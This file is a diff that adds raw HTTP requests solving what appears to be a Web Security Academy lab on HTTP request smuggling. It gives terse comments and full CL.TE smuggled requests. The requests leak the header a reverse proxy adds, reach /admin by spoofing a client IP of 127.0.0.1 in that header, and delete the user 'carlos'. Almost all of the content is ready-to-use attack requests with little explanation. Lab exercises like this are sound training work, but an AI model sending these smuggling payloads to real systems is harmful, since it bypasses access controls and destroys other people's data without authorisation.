@@ -1,0 +1,100 @@
+// First, find out the POST request where a parameter is reflected in response
+// Second, find out the extra header added by reverse proxy server to specify the client IP (Find out how request is being rewrite)
+
+POST / HTTP/1.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 561
+Connection: keep-alive
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80					# Increase the content-length gradually to reveal more headers
+Connection: close
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+
+search=
+
+// Rewrite your smuggled request for /admin like how it should be rewritten by reverse proxy
+POST / HTTP/1.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 561
+Connection: keep-alive
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+X-fnmBRF-Ip: 127.0.0.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Connection: close
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+
+search=
+
+// After find out the admin page, delete the user carlos
+
+POST / HTTP/1.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 612
+Connection: keep-alive
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-fnmBRF-Ip: 127.0.0.1
+Host: acce1f211ee415a9809163fa00d1001d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acce1f211ee415a9809163fa00d1001d.web-security-academy.net/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Connection: close
+Cookie: session=pmST4NywFQM17VuSvuNGOgSoS0CZrdW5
+Upgrade-Insecure-Requests: 1
+
+search=
